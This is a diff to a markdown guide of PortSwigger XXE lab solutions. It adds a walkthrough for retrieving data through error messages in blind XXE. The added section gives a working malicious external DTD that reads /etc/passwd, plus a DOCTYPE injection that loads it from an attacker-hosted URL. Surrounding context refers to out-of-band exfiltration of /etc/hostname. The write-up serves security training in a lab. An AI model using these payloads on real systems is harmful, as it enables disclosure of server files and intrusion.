@@ -9,6 +9,7 @@
 - [Blind XXE with out-of-band interaction](#blind-xxe-with-out-of-band-interaction)
 - [Blind XXE with out-of-band interaction via XML parameter entities](#blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities)
 - [Exploiting blind XXE to exfiltrate data using a malicious external DTD](#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
+- [Exploiting blind XXE to retrieve data via error messages](#exploiting-blind-xxe-to-retrieve-data-via-error-messages)
 
 ## Exploiting XXE using external entities to retrieve files
 Reference: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
@@ -93,3 +94,24 @@ In this lab a **malicious** DTD must be crafted and hosted on the exploit server
 ```
 7. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
 8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the ``/etc/hostname`` file.
+
+## Exploiting blind XXE to retrieve data via error messages
+Reference: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
+
+<!-- omit in toc -->
+### Solution
+1. Click "Go to exploit server" and save the following malicious DTD file on your server:
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+```
+When imported, this page will read the contents of ``/etc/passwd`` into the ``file`` entity, and then try to use that entity in a file path.
+1. Click "View exploit" and take a note of the URL for your malicious DTD.
+2. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
+3. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+```
+You should see an error message containing the contents of the ``/etc/passwd`` file.
